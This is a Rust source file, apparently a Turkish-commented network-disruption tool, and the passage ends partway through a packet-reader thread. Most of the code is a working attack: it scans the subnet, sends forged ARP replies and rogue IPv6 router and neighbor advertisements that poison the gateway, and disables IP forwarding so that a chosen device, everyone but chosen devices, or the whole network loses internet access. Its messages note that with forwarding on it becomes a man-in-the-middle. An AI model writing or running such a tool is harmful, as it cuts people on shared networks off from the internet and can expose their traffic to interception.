use std::collections::HashMap;
use std::fs;
use std::io::Write;
use std::net::{Ipv4Addr, Ipv6Addr};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;
use std::time::{Duration, Instant};

use pnet::datalink::{self, Channel, Config, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet::ipnetwork::IpNetwork;
use pnet::packet::arp::{
    ArpHardwareTypes, ArpOperation, ArpOperations, ArpPacket, MutableArpPacket,
};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;

static SHUTDOWN_START: OnceLock<Instant> = OnceLock::new();

const BROADCAST_MAC: MacAddr = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
const ALL_NODES_MAC: MacAddr = MacAddr(0x33, 0x33, 0x00, 0x00, 0x00, 0x01);
const ALL_ROUTERS_MAC: MacAddr = MacAddr(0x33, 0x33, 0x00, 0x00, 0x00, 0x02);

const PACKET_SIZE: usize = 42;
const IPV6_PACKET_SIZE: usize = 256;

const SPOOF_INTERVAL_MS: u64 = 500;
const SCAN_INTERVAL_MS: u64 = 30_000;
const INITIAL_SCAN_WAIT_MS: u64 = 6_000;
const BG_SCAN_WAIT_MS: u64 = 2_000;
const TX_PACING_US: u64 = 1_500;
const SCAN_PACING_MS: u64 = 2;
/// Alt ağ çok büyükse tarama en fazla bu prefix'e kadar genişletilir (/22).
const MAX_SCAN_PREFIX: u8 = 22;

const SYSCTL_IPV4_FORWARD: &str = "/proc/sys/net/ipv4/ip_forward";
const SYSCTL_IPV6_FORWARD: &str = "/proc/sys/net/ipv6/conf/all/forwarding";
/// Hedefli modlarda IPv6 adresi ogrenmek icin kac spoof turunda bir ff02::1
/// adresine echo istegi gonderilir.
const DISCOVERY_ECHO_CYCLES: u64 = 4;

const ETHERTYPE_IPV6: u16 = 0x86DD;
const IPPROTO_ICMPV6: u8 = 58;
const ICMPV6_RS: u8 = 133;
const ICMPV6_RA: u8 = 134;
#[allow(dead_code)]
const ICMPV6_NS: u8 = 135;
const ICMPV6_NA: u8 = 136;

const ALL_NODES_V6: Ipv6Addr = Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 0, 1);
const ALL_ROUTERS_V6: Ipv6Addr = Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 0, 2);

fn dbg(msg: &str) {
    let elapsed = SHUTDOWN_START
        .get()
        .map(|t| t.elapsed())
        .unwrap_or_default();
    eprintln!("[DEBUG +{:>8.3}s] {}", elapsed.as_secs_f64(), msg);
    let _ = std::io::stderr().flush();
}

fn has_cap_net_raw() -> bool {
    if unsafe { libc::geteuid() } == 0 {
        return true;
    }
    if let Ok(status) = fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if let Some(caps) = line.strip_prefix("CapEff:\t") {
                if let Ok(mask) = u64::from_str_radix(caps.trim(), 16) {
                    return mask & (1 << 13) != 0;
                }
            }
        }
    }
    false
}

fn ip_forward_enabled() -> Option<bool> {
    fs::read_to_string(SYSCTL_IPV4_FORWARD)
        .ok()
        .map(|s| s.trim() == "1")
}

fn read_sysctl_flag(path: &str) -> Option<bool> {
    fs::read_to_string(path).ok().map(|s| s.trim() == "1")
}

fn write_sysctl_flag(path: &str, on: bool) -> bool {
    fs::write(path, if on { "1" } else { "0" }).is_ok() && read_sysctl_flag(path) == Some(on)
}

/// "Sadece interneti kes" hedefi için yönlendirmeyi kapatır ve çıkışta eski
/// hâline döndürür. `ip_forward=1` iken trafik yönlendirilir; bu durumda
/// program MITM gibi davranır ve bağlantı kesilmez.
struct ForwardGuard {
    v4_restore: bool,
    v6_restore: bool,
}

impl ForwardGuard {
    fn enforce() -> Self {
        let mut guard = Self {
            v4_restore: false,
            v6_restore: false,
        };

        if read_sysctl_flag(SYSCTL_IPV4_FORWARD) == Some(true) {
            if write_sysctl_flag(SYSCTL_IPV4_FORWARD, false) {
                guard.v4_restore = true;
                println!(
                    "ℹ️  net.ipv4.ip_forward=1 idi; kesme için 0 yapıldı (çıkışta geri alınacak)."
                );
            } else {
                println!("⚠️  net.ipv4.ip_forward=1 ve değiştirilemedi!");
                println!("   Trafik yönlendirilir, kesme yerine MITM olur.");
                println!("   sudo ile çalıştır veya: sudo sysctl -w net.ipv4.ip_forward=0");
            }
        }

        if read_sysctl_flag(SYSCTL_IPV6_FORWARD) == Some(true) {
            if write_sysctl_flag(SYSCTL_IPV6_FORWARD, false) {
                guard.v6_restore = true;
                println!(
                    "ℹ️  IPv6 yönlendirme açıktı; kesme için kapatıldı (çıkışta geri alınacak)."
                );
            } else {
                println!(
                    "⚠️  IPv6 yönlendirme açık ve değiştirilemedi; IPv6 trafiği yönlendirilebilir."
                );
            }
        }

        guard
    }

    /// Değiştirdiğimiz ayarları geri alır. `_exit` öncesinde açıkça çağrılmalı.
    fn restore(&mut self) {
        if self.v4_restore {
            write_sysctl_flag(SYSCTL_IPV4_FORWARD, true);
            self.v4_restore = false;
        }
        if self.v6_restore {
            write_sysctl_flag(SYSCTL_IPV6_FORWARD, true);
            self.v6_restore = false;
        }
    }
}

impl Drop for ForwardGuard {
    fn drop(&mut self) {
        self.restore();
    }
}

fn icmpv6_checksum(src: &Ipv6Addr, dst: &Ipv6Addr, icmp: &[u8]) -> u16 {
    let mut sum: u32 = 0;

    for seg in src.segments() {
        sum += seg as u32;
    }
    for seg in dst.segments() {
        sum += seg as u32;
    }
    sum += icmp.len() as u32;
    sum += IPPROTO_ICMPV6 as u32;

    let mut chunks = icmp.chunks_exact(2);
    for c in &mut chunks {
        sum += ((c[0] as u32) << 8) | (c[1] as u32);
    }
    if let Some(&b) = chunks.remainder().first() {
        sum += (b as u32) << 8;
    }

    while sum > 0xFFFF {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    !(sum as u16)
}

/// Uygulamanın çalışma (saldırı) modu.
#[derive(Clone, Copy, PartialEq, Eq)]
enum AttackMode {
    /// Yalnızca seçilen cihaz(lar)ı kes.
    Single,
    /// Seçilen cihaz(lar) hariç ağdaki herkesi kes (korunan cihazlar).
    ExceptOne,
    /// Ağdaki herkesi kes.
    Everyone,
}

struct Shared {
    running: AtomicBool,
    targets: Mutex<HashMap<Ipv4Addr, MacAddr>>,
    targets_v6: Mutex<HashMap<Ipv6Addr, MacAddr>>,
    /// Tek hedef modunda kilitlenen cihazlar: (IP, MAC) listesi. Boş ise "herkesi kes" modu.
    pinned: Mutex<Vec<(Ipv4Addr, MacAddr)>>,
    /// "Hedef hariç herkes" modunda korunan (kesilmeyen) cihazlar: (IP, MAC) listesi.
    /// Boş ise dışlama yok.
    excluded: Mutex<Vec<(Ipv4Addr, MacAddr)>>,
    scan_cycles: AtomicU64,
    spoof_packets: AtomicU64,
    instant_replies: AtomicU64,
    start_time: Instant,

    reader_alive: AtomicBool,
    sender_alive: AtomicBool,
    bg_alive: AtomicBool,
    display_alive: AtomicBool,
}

impl Shared {
    fn new() -> Self {
        Self {
            running: AtomicBool::new(true),
            targets: Mutex::new(HashMap::new()),
            targets_v6: Mutex::new(HashMap::new()),
            pinned: Mutex::new(Vec::new()),
            excluded: Mutex::new(Vec::new()),
            scan_cycles: AtomicU64::new(0),
            spoof_packets: AtomicU64::new(0),
            instant_replies: AtomicU64::new(0),
            start_time: Instant::now(),
            reader_alive: AtomicBool::new(true),
            sender_alive: AtomicBool::new(true),
            bg_alive: AtomicBool::new(true),
            display_alive: AtomicBool::new(true),
        }
    }

    /// Tek hedef modunda kilitli cihazları döner.
    fn pinned_targets(&self) -> Vec<(Ipv4Addr, MacAddr)> {
        self.pinned.lock().map(|g| g.clone()).unwrap_or_default()
    }

    /// Tek hedef modu aktifse (en az bir kilitli cihaz varsa) true döner.
    fn pinned_mode(&self) -> bool {
        self.pinned.lock().map(|g| !g.is_empty()).unwrap_or(false)
    }

    /// Tek hedef modunu etkinleştirir ve seçilen cihazları kilitler.
    fn set_pinned(&self, targets: Vec<(Ipv4Addr, MacAddr)>) {
        if let Ok(mut g) = self.pinned.lock() {
            *g = targets;
        }
    }

    /// "Hedef hariç herkes" modunda korunan cihazları döner.
    fn excluded_targets(&self) -> Vec<(Ipv4Addr, MacAddr)> {
        self.excluded.lock().map(|g| g.clone()).unwrap_or_default()
    }

    /// "Hedef hariç herkes" modu aktifse (en az bir korunan cihaz varsa) true döner.
    fn excluded_mode(&self) -> bool {
        self.excluded.lock().map(|g| !g.is_empty()).unwrap_or(false)
    }

    /// "Hedef hariç herkes" modunu etkinleştirir ve korunacak cihazları kilitler.
    fn set_excluded(&self, targets: Vec<(Ipv4Addr, MacAddr)>) {
        if let Ok(mut g) = self.excluded.lock() {
            *g = targets;
        }
    }

    /// Hedefli bir modda (tek hedef / hedef hariç) kesilecek bir cihazın IPv6
    /// adresi henüz öğrenilmediyse true döner. "Herkesi kes" modunda keşif
    /// gerekmez; RA zaten tüm ağı kapsar.
    fn v6_discovery_needed(&self) -> bool {
        let pinned = self.pinned_targets();
        if pinned.is_empty() && !self.excluded_mode() {
            return false;
        }

        // Kesilecek cihazların MAC adresleri: tek hedef modunda kilitliler,
        // "hedef hariç" modunda ise ARP ile bulunmuş (korunmayan) cihazlar.
        let victim_macs: Vec<MacAddr> = if !pinned.is_empty() {
            pinned.iter().map(|(_, m)| *m).collect()
        } else {
            self.targets
                .lock()
                .map(|t| t.values().copied().collect())
                .unwrap_or_default()
        };
        if victim_macs.is_empty() {
            return false;
        }

        let known: Vec<MacAddr> = self
            .targets_v6
            .lock()
            .map(|t| t.values().copied().collect())
            .unwrap_or_default();
        victim_macs.iter().any(|m| !known.contains(m))
    }

    fn alive_count(&self) -> u32 {
        let mut n = 0;
        if self.reader_alive.load(Ordering::SeqCst) {
            n += 1;
        }
        if self.sender_alive.load(Ordering::SeqCst) {
            n += 1;
        }
        if self.bg_alive.load(Ordering::SeqCst) {
            n += 1;
        }
        if self.display_alive.load(Ordering::SeqCst) {
            n += 1;
        }
        n
    }

    fn alive_report(&self) -> String {
        format!(
            "reader={} sender={} bg={} display={}",
            self.reader_alive.load(Ordering::SeqCst),
            self.sender_alive.load(Ordering::SeqCst),
            self.bg_alive.load(Ordering::SeqCst),
            self.display_alive.load(Ordering::SeqCst),
        )
    }
}

#[derive(Clone)]
struct NetworkInfo {
    interface: NetworkInterface,
    local_ip: Ipv4Addr,
    local_prefix: u8,
    local_mac: MacAddr,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
    local_ipv6: Option<Ipv6Addr>,
    gateway_ipv6: Option<Ipv6Addr>,
}

impl NetworkInfo {
    /// Prefix uzunluğundan IPv4 alt ağ maskesi üretir.
    fn prefix_mask(prefix: u8) -> u32 {
        if prefix == 0 {
            0
        } else {
            u32::MAX << (32 - u32::from(prefix))
        }
    }

    /// Arayüzün gerçek alt ağ maskesi.
    fn subnet_mask(&self) -> u32 {
        Self::prefix_mask(self.local_prefix)
    }

    /// Taranacak alt ağın ilk/son kullanılabilir adresi (ağ ve yayın hariç).
    /// Çok büyük ağlarda (ör. /16) tarama /22'ye kadar daraltılır.
    fn scan_host_range(&self) -> (u32, u32) {
        let scan_prefix = self.local_prefix.max(MAX_SCAN_PREFIX);
        let mask = Self::prefix_mask(scan_prefix);
        let base = u32::from(self.local_ip) & mask;
        let broadcast = base | !mask;
        (base.saturating_add(1), broadcast.saturating_sub(1))
    }

    /// Verilen IPv4 adresi bu arayüzün alt ağında mı?
    fn in_subnet(&self, ip: Ipv4Addr) -> bool {
        let mask = self.subnet_mask();
        (u32::from(ip) & mask) == (u32::from(self.local_ip) & mask)
    }
}

fn build_arp_request(buf: &mut [u8], src_mac: MacAddr, src_ip: Ipv4Addr, target_ip: Ipv4Addr) {
    let mut eth = MutableEthernetPacket::new(buf).unwrap();
    eth.set_destination(BROADCAST_MAC);
    eth.set_source(src_mac);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp = MutableArpPacket::new(eth.payload_mut()).unwrap();
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(ArpOperations::Request);
    arp.set_sender_hw_addr(src_mac);
    arp.set_sender_proto_addr(src_ip);
    arp.set_target_hw_addr(MacAddr::zero());
    arp.set_target_proto_addr(target_ip);
}

#[allow(clippy::too_many_arguments)]
fn build_arp_spoof(
    buf: &mut [u8],
    eth_src: MacAddr,
    eth_dst: MacAddr,
    spoofed_mac: MacAddr,
    spoofed_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
    op: ArpOperation,
) {
    let mut eth = MutableEthernetPacket::new(buf).unwrap();
    eth.set_destination(eth_dst);
    eth.set_source(eth_src);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp = MutableArpPacket::new(eth.payload_mut()).unwrap();
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(op);
    arp.set_sender_hw_addr(spoofed_mac);
    arp.set_sender_proto_addr(spoofed_ip);
    arp.set_target_hw_addr(target_mac);
    arp.set_target_proto_addr(target_ip);
}

fn build_ndp_rs(buf: &mut [u8], eth_src: MacAddr, src_ipv6: Ipv6Addr) -> usize {
    let total = 14 + 40 + 16;
    let b = &mut buf[..total];

    b[0..6].copy_from_slice(&[
        ALL_ROUTERS_MAC.0,
        ALL_ROUTERS_MAC.1,
        ALL_ROUTERS_MAC.2,
        ALL_ROUTERS_MAC.3,
        ALL_ROUTERS_MAC.4,
        ALL_ROUTERS_MAC.5,
    ]);
    b[6..12].copy_from_slice(&[
        eth_src.0, eth_src.1, eth_src.2, eth_src.3, eth_src.4, eth_src.5,
    ]);
    b[12..14].copy_from_slice(&ETHERTYPE_IPV6.to_be_bytes());

    b[14..18].copy_from_slice(&[0x60, 0x00, 0x00, 0x00]);
    b[18..20].copy_from_slice(&16u16.to_be_bytes());
    b[20] = IPPROTO_ICMPV6;
    b[21] = 255;
    b[22..38].copy_from_slice(&src_ipv6.octets());
    b[38..54].copy_from_slice(&ALL_ROUTERS_V6.octets());

    b[54] = ICMPV6_RS;
    b[55] = 0;
    b[56..58].copy_from_slice(&[0, 0]);
    b[58..62].copy_from_slice(&0u32.to_be_bytes());

    b[62] = 1;
    b[63] = 1;
    b[64..70].copy_from_slice(&[
        eth_src.0, eth_src.1, eth_src.2, eth_src.3, eth_src.4, eth_src.5,
    ]);

    let cksum = icmpv6_checksum(&src_ipv6, &ALL_ROUTERS_V6, &b[54..70]);
    b[56..58].copy_from_slice(&cksum.to_be_bytes());

    total
}

fn build_ndp_ra(
    buf: &mut [u8],
    eth_src: MacAddr,
    src_ipv6: Ipv6Addr,
    router_lifetime: u16,
) -> usize {
    let total = 14 + 40 + 24;
    let b = &mut buf[..total];

    b[0..6].copy_from_slice(&[
        ALL_NODES_MAC.0,
        ALL_NODES_MAC.1,
        ALL_NODES_MAC.2,
        ALL_NODES_MAC.3,
        ALL_NODES_MAC.4,
        ALL_NODES_MAC.5,
    ]);
    b[6..12].copy_from_slice(&[
        eth_src.0, eth_src.1, eth_src.2, eth_src.3, eth_src.4, eth_src.5,
    ]);
    b[12..14].copy_from_slice(&ETHERTYPE_IPV6.to_be_bytes());

    b[14..18].copy_from_slice(&[0x60, 0x00, 0x00, 0x00]);
    b[18..20].copy_from_slice(&24u16.to_be_bytes());
    b[20] = IPPROTO_ICMPV6;
    b[21] = 255;
    b[22..38].copy_from_slice(&src_ipv6.octets());
    b[38..54].copy_from_slice(&ALL_NODES_V6.octets());

    b[54] = ICMPV6_RA;
    b[55] = 0;
    b[56..58].copy_from_slice(&[0, 0]);
    b[58] = 64;
    b[59] = 0;
    b[60..62].copy_from_slice(&router_lifetime.to_be_bytes());
    b[62..66].copy_from_slice(&0u32.to_be_bytes());
    b[66..70].copy_from_slice(&0u32.to_be_bytes());

    b[70] = 1;
    b[71] = 1;
    b[72..78].copy_from_slice(&[
        eth_src.0, eth_src.1, eth_src.2, eth_src.3, eth_src.4, eth_src.5,
    ]);

    let cksum = icmpv6_checksum(&src_ipv6, &ALL_NODES_V6, &b[54..78]);
    b[56..58].copy_from_slice(&cksum.to_be_bytes());

    total
}

/// NDP Neighbor Advertisement uretir.
///
/// `router` true ise NA'daki Router (R) bayragi set edilir. Gateway'in
/// link-local adresini zehirlerken/düzeltirken bu bayrak set edilmelidir;
/// aksi halde cihaz gateway'i "artik router degil" sanip varsayilan rotayi
/// kaldirabilir. `solicited` true ise Solicited (S) bayragi da set edilir;
/// bu, gelen bir NS'e verilen cevapta komşu kaydini REACHABLE yapar.
#[allow(clippy::too_many_arguments)]
fn build_ndp_na(
    buf: &mut [u8],
    eth_src: MacAddr,
    eth_dst: MacAddr,
    src_ipv6: Ipv6Addr,
    dst_ipv6: Ipv6Addr,
    target_ipv6: Ipv6Addr,
    lladdr: MacAddr,
    router: bool,
    solicited: bool,
) -> usize {
    let total = 14 + 40 + 32;
    let b = &mut buf[..total];

    b[0..6].copy_from_slice(&[
        eth_dst.0, eth_dst.1, eth_dst.2, eth_dst.3, eth_dst.4, eth_dst.5,
    ]);
    b[6..12].copy_from_slice(&[
        eth_src.0, eth_src.1, eth_src.2, eth_src.3, eth_src.4, eth_src.5,
    ]);
    b[12..14].copy_from_slice(&ETHERTYPE_IPV6.to_be_bytes());

    b[14..18].copy_from_slice(&[0x60, 0x00, 0x00, 0x00]);
    b[18..20].copy_from_slice(&32u16.to_be_bytes());
    b[20] = IPPROTO_ICMPV6;
    b[21] = 255;
    b[22..38].copy_from_slice(&src_ipv6.octets());
    b[38..54].copy_from_slice(&dst_ipv6.octets());

    b[54] = ICMPV6_NA;
    b[55] = 0;
    b[56..58].copy_from_slice(&[0, 0]);
    // R=1 (router) | S=1 (solicited) | O=1 (override)
    let mut flags: u32 = 0x2000_0000;
    if router {
        flags |= 0x8000_0000;
    }
    if solicited {
        flags |= 0x4000_0000;
    }
    b[58..62].copy_from_slice(&flags.to_be_bytes());
    b[62..78].copy_from_slice(&target_ipv6.octets());

    b[78] = 2;
    b[79] = 1;
    b[80..86].copy_from_slice(&[lladdr.0, lladdr.1, lladdr.2, lladdr.3, lladdr.4, lladdr.5]);

    let cksum = icmpv6_checksum(&src_ipv6, &dst_ipv6, &b[54..86]);
    b[56..58].copy_from_slice(&cksum.to_be_bytes());

    total
}

/// ff02::1 (tum dugumler) adresine ICMPv6 Echo Request uretir.
///
/// Hedefli modlarda kesilecek cihazin IPv6 adresini ogrenmek icin kullanilir:
/// istege tum IPv6 dugumleri kendi link-local adreslerinden cevap verir, biz de
/// cevap paketlerinden (IP + MAC) hedefleri kaydederiz.
fn build_icmpv6_echo_request(
    buf: &mut [u8],
    eth_src: MacAddr,
    src_ipv6: Ipv6Addr,
    dst_ipv6: Ipv6Addr,
    seq: u16,
) -> usize {
    let total = 14 + 40 + 12;
    let b = &mut buf[..total];

    b[0..6].copy_from_slice(&[
        ALL_NODES_MAC.0,
        ALL_NODES_MAC.1,
        ALL_NODES_MAC.2,
        ALL_NODES_MAC.3,
        ALL_NODES_MAC.4,
        ALL_NODES_MAC.5,
    ]);
    b[6..12].copy_from_slice(&[
        eth_src.0, eth_src.1, eth_src.2, eth_src.3, eth_src.4, eth_src.5,
    ]);
    b[12..14].copy_from_slice(&ETHERTYPE_IPV6.to_be_bytes());

    b[14..18].copy_from_slice(&[0x60, 0x00, 0x00, 0x00]);
    b[18..20].copy_from_slice(&12u16.to_be_bytes());
    b[20] = IPPROTO_ICMPV6;
    b[21] = 255;
    b[22..38].copy_from_slice(&src_ipv6.octets());
    b[38..54].copy_from_slice(&dst_ipv6.octets());

    b[54] = 128; // Echo Request
    b[55] = 0;
    b[56..58].copy_from_slice(&[0, 0]);
    b[58..60].copy_from_slice(&0x4152u16.to_be_bytes());
    b[60..62].copy_from_slice(&seq.to_be_bytes());
    b[62..66].copy_from_slice(&0x4150_5300u32.to_be_bytes());

    let cksum = icmpv6_checksum(&src_ipv6, &dst_ipv6, &b[54..66]);
    b[56..58].copy_from_slice(&cksum.to_be_bytes());

    total
}

fn is_virtual_interface(name: &str) -> bool {
    name.starts_with("docker")
        || name.starts_with("veth")
        || name.starts_with("br-")
        || name.starts_with("virbr")
        || name.starts_with("vmnet")
        || name.starts_with("tun")
        || name.starts_with("tap")
        || name.starts_with("wg")
        || name.starts_with("zt")
        || name == "lo"
}

fn detect_network() -> Option<NetworkInfo> {
    let interfaces = datalink::interfaces();
    let iface = interfaces.into_iter().find(|i| {
        i.is_up()
            && !i.is_loopback()
            && !is_virtual_interface(&i.name)
            && i.ips.iter().any(|ip| matches!(ip, IpNetwork::V4(_)))
    })?;

    let (local_ip, local_prefix) = iface.ips.iter().find_map(|ip| match ip {
        IpNetwork::V4(v4) => Some((v4.ip(), v4.prefix())),
        _ => None,
    })?;
    let local_mac = iface.mac?;
    let gateway_ip = detect_gateway()?;

    let local_ipv6 = iface.ips.iter().find_map(|ip| match ip {
        IpNetwork::V6(v6) => {
            let a = v6.ip();
            if (a.segments()[0] & 0xffc0) == 0xfe80 {
                Some(a)
            } else {
                None
            }
        }
        _ => None,
    });

    Some(NetworkInfo {
        interface: iface,
        local_ip,
        local_prefix,
        local_mac,
        gateway_ip,
        gateway_mac: MacAddr::zero(),
        local_ipv6,
        gateway_ipv6: None,
    })
}

fn detect_gateway() -> Option<Ipv4Addr> {
    let content = fs::read_to_string("/proc/net/route").ok()?;
    for line in content.lines().skip(1) {
        let f: Vec<&str> = line.split_whitespace().collect();
        if f.len() < 3 {
            continue;
        }
        if f[1] == "00000000" {
            let gw_hex = u32::from_str_radix(f[2], 16).ok()?;
            let b = gw_hex.to_le_bytes();
            return Some(Ipv4Addr::new(b[0], b[1], b[2], b[3]));
        }
    }
    None
}

fn resolve_gateway_mac(
    tx: &mut Box<dyn DataLinkSender>,
    rx: &mut Box<dyn DataLinkReceiver>,
    local_mac: MacAddr,
    local_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
) -> Option<MacAddr> {
    let mut buf = [0u8; PACKET_SIZE];
    build_arp_request(&mut buf, local_mac, local_ip, gateway_ip);

    for _ in 0..3 {
        tx.send_to(&buf, None)?.ok()?;

        let deadline = Instant::now() + Duration::from_secs(2);
        while Instant::now() < deadline {
            if let Ok(packet) = rx.next() {
                if let Some((ip, mac)) = extract_arp_reply(packet, local_mac) {
                    if ip == gateway_ip {
                        return Some(mac);
                    }
                }
            }
        }
    }
    None
}

fn resolve_gateway_ipv6(
    tx: &mut Box<dyn DataLinkSender>,
    rx: &mut Box<dyn DataLinkReceiver>,
    local_mac: MacAddr,
    local_ipv6: Ipv6Addr,
) -> Option<Ipv6Addr> {
    let mut buf = [0u8; IPV6_PACKET_SIZE];
    let len = build_ndp_rs(&mut buf, local_mac, local_ipv6);

    for _ in 0..3 {
        tx.send_to(&buf[..len], None)?.ok()?;

        let deadline = Instant::now() + Duration::from_secs(2);
        while Instant::now() < deadline {
            if let Ok(packet) = rx.next() {
                if let Some(addr) = extract_ra(packet, local_mac) {
                    return Some(addr);
                }
            }
        }
    }
    None
}

fn extract_arp_reply(packet: &[u8], our_mac: MacAddr) -> Option<(Ipv4Addr, MacAddr)> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Arp {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let arp = ArpPacket::new(eth.payload())?;
    if arp.get_operation() != ArpOperations::Reply {
        return None;
    }
    if arp.get_hw_addr_len() != 6 || arp.get_proto_addr_len() != 4 {
        return None;
    }
    if eth.get_source() != arp.get_sender_hw_addr() {
        return None;
    }
    Some((arp.get_sender_proto_addr(), arp.get_sender_hw_addr()))
}

fn extract_arp_sender(packet: &[u8], our_mac: MacAddr) -> Option<(Ipv4Addr, MacAddr)> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Arp {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let arp = ArpPacket::new(eth.payload())?;
    let op = arp.get_operation();
    if op != ArpOperations::Reply && op != ArpOperations::Request {
        return None;
    }
    if arp.get_hw_addr_len() != 6 || arp.get_proto_addr_len() != 4 {
        return None;
    }
    if eth.get_source() != arp.get_sender_hw_addr() {
        return None;
    }
    let ip = arp.get_sender_proto_addr();
    if ip.is_unspecified() || ip.is_broadcast() || ip.is_multicast() {
        return None;
    }
    Some((ip, arp.get_sender_hw_addr()))
}

fn extract_arp_request(packet: &[u8], our_mac: MacAddr) -> Option<(Ipv4Addr, MacAddr, Ipv4Addr)> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Arp {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let arp = ArpPacket::new(eth.payload())?;
    if arp.get_operation() != ArpOperations::Request {
        return None;
    }
    if arp.get_hw_addr_len() != 6 || arp.get_proto_addr_len() != 4 {
        return None;
    }
    let sender_ip = arp.get_sender_proto_addr();
    if sender_ip.is_unspecified() || sender_ip.is_broadcast() || sender_ip.is_multicast() {
        return None;
    }
    let target_ip = arp.get_target_proto_addr();
    Some((sender_ip, eth.get_source(), target_ip))
}

fn extract_ipv6_sender(packet: &[u8], our_mac: MacAddr) -> Option<(Ipv6Addr, MacAddr)> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Ipv6 {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let payload = eth.payload();
    if payload.len() < 40 {
        return None;
    }
    let mut src_bytes = [0u8; 16];
    src_bytes.copy_from_slice(&payload[8..24]);
    let src = Ipv6Addr::from(src_bytes);

    if (src.segments()[0] & 0xffc0) != 0xfe80 {
        return None;
    }
    Some((src, eth.get_source()))
}

fn extract_ra(packet: &[u8], our_mac: MacAddr) -> Option<Ipv6Addr> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Ipv6 {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let payload = eth.payload();
    if payload.len() < 40 + 4 {
        return None;
    }
    if payload[6] != IPPROTO_ICMPV6 {
        return None;
    }
    if payload[40] != ICMPV6_RA {
        return None;
    }
    let mut src_bytes = [0u8; 16];
    src_bytes.copy_from_slice(&payload[8..24]);
    let src = Ipv6Addr::from(src_bytes);

    if (src.segments()[0] & 0xffc0) != 0xfe80 {
        return None;
    }
    Some(src)
}

/// Gelen IPv6 komşu isteğini (Neighbor Solicitation) ayrıştırır.
/// Dönen değer: (isteyenin IPv6 adresi, isteyenin MAC'i, sorulan hedef adres).
fn extract_icmpv6_ns(packet: &[u8], our_mac: MacAddr) -> Option<(Ipv6Addr, MacAddr, Ipv6Addr)> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Ipv6 {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let payload = eth.payload();
    // IPv6 başlığı (40) + NS (24)
    if payload.len() < 40 + 24 {
        return None;
    }
    if payload[6] != IPPROTO_ICMPV6 || payload[40] != ICMPV6_NS || payload[41] != 0 {
        return None;
    }

    let mut src_bytes = [0u8; 16];
    src_bytes.copy_from_slice(&payload[8..24]);
    let src = Ipv6Addr::from(src_bytes);
    // DAD sorgusunda kaynak :: olur; cevap vermeye gerek yok.
    if src.is_unspecified() || src.is_multicast() {
        return None;
    }

    let mut target_bytes = [0u8; 16];
    target_bytes.copy_from_slice(&payload[48..64]);
    Some((src, eth.get_source(), Ipv6Addr::from(target_bytes)))
}

fn interruptible_sleep(shared: &Shared, total_ms: u64) {
    let mut slept: u64 = 0;
    while slept < total_ms && shared.running.load(Ordering::SeqCst) {
        let step = 50u64.min(total_ms - slept);
        thread::sleep(Duration::from_millis(step));
        slept += step;
    }
}

fn scan_full_subnet(
    tx: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    net: &NetworkInfo,
    wait: Duration,
    shared: &Shared,
) {
    // Arayüzün gerçek alt ağını tara (ör. /22 ise 1022 adres), varsayılan /24'ü değil.
    let (first, last) = net.scan_host_range();
    let mut buf = [0u8; PACKET_SIZE];
    let mut addr = first;

    while addr <= last {
        if !shared.running.load(Ordering::SeqCst) {
            return;
        }
        let target_ip = Ipv4Addr::from(addr);
        addr = addr.saturating_add(1);

        if target_ip == net.local_ip || target_ip == net.gateway_ip {
            continue;
        }

        build_arp_request(&mut buf, net.local_mac, net.local_ip, target_ip);
        // Kilidi sadece gönderim sırasında tut; bekleme kilidin dışında.
        if let Ok(mut t) = tx.lock() {
            let _ = t.send_to(&buf, None);
        }
        thread::sleep(Duration::from_millis(SCAN_PACING_MS));
    }

    interruptible_sleep(shared, wait.as_millis() as u64);
}

fn spawn_reader(
    mut rx: Box<dyn DataLinkReceiver>,
    shared: Arc<Shared>,
    net: Arc<NetworkInfo>,
    tx: Arc<Mutex<Box<dyn DataLinkSender>>>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut buf = [0u8; PACKET_SIZE];
        let mut v6_buf = [0u8; IPV6_PACKET_SIZE];

        while shared.running.load(Ordering::SeqCst) {
            let packet = match rx.next() {
                Ok(p) => p,
                Err(_) => continue,
            };

            if !shared.running.load(Ordering::SeqCst) {
                break;
            }

            if let Some((sender_ip, sender_mac, target_ip)) =
                extract_arp_request(packet, net.local_mac)
            {
                let is_about_us = target_ip == net.local_ip;
                let is_from_us = sender_ip == net.local_ip;

                if is_about_us {
                    if let Ok(mut t) = tx.try_lock() {
                        build_arp_spoof(
                            &mut buf,
                            net.local_mac,
                            sender_mac,
                            net.local_mac,
                            net.local_ip,
